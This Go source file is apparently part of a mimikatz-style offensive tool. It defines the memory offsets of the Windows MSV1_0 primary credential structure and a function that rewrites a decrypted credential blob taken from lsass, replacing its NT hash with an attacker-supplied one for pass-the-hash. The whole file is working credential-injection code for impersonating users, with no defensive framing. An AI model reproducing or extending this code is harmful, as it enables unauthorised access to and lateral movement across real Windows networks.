package sekurlsa

import "fmt"

// MSV1_0_PRIMARY_CREDENTIAL field offsets (MS-MSV layout, see
// parseMSVPrimary). Public reference: every credential-extraction
// tool agrees on these for Win10 1903+:
//
//	+0x00  LogonDomainName UNICODE_STRING
//	+0x10  UserName        UNICODE_STRING
//	+0x20  NtOwfPassword   OWF (16 bytes)
//	+0x30  LmOwfPassword   OWF (16 bytes)
//	+0x40  ShaOwPassword   OWF (20 bytes) — Win11+ only
const (
	msvPrimaryNTHashOffset = 0x20
	msvPrimaryLMHashOffset = 0x30
	msvPrimarySHA1Offset   = 0x40
	msvPrimaryNTHashLen    = 16
	msvPrimaryLMHashLen    = 16
	msvPrimarySHA1Len      = 20
	msvPrimaryNTAndLMEnd   = msvPrimaryLMHashOffset + msvPrimaryLMHashLen // 0x40
	msvPrimaryWithSHA1End  = msvPrimarySHA1Offset + msvPrimarySHA1Len     // 0x54
)

// mutateMSVPrimary takes the decrypted MSV1_0_PRIMARY_CREDENTIAL
// blob extracted from lsass and overwrites the NT / LM / SHA1
// hash fields with the values supplied in the PTHTarget. Returns a
// NEW slice — the input is not modified.
//
// LM is always written as zero bytes (matching post-Vista Windows
// where LM is disabled by default; supplying an LM hash via PTH
// rarely helps and Windows rejects pre-NTLMv2 auth from any
// hardened DC). SHA1 is preserved — PTHTarget does not carry one,
// and the lsass-derived value is what Win11 expects for DPAPI-AES
// derivation.
//
// AES128 / AES256 do NOT live in MSV — they live in the per-LUID
// Kerberos session struct, which the next chantier slice handles
// separately.
//
// Cross-platform: this is pure data manipulation. The Windows-
// specific spawn / write-back lives in pth_windows.go. PTHTarget
// is also defined in pth_windows.go because callers only consume it
// through the Windows-only Pass / PassImpersonate entry points.
//
// Returns ErrPTHWriteFailed wrapped if the plaintext is too short
// for an MSV primary credential layout.
func mutateMSVPrimary(plaintext []byte, target PTHTarget) ([]byte, error) {
	if len(plaintext) < msvPrimaryNTAndLMEnd {
		return nil, fmt.Errorf("%w: plaintext len %d < MSV primary minimum %d",
			ErrPTHWriteFailed, len(plaintext), msvPrimaryNTAndLMEnd)
	}
	out := append([]byte(nil), plaintext...)
	// NT — required, validated upstream.
	copy(out[msvPrimaryNTHashOffset:msvPrimaryLMHashOffset], target.NTLM)
	// LM — write zeros (post-Vista default; mimikatz behavior).
	for i := msvPrimaryLMHashOffset; i < msvPrimaryNTAndLMEnd; i++ {
		out[i] = 0
	}
	// SHA1 — preserve existing bytes.
	return out, nil
}
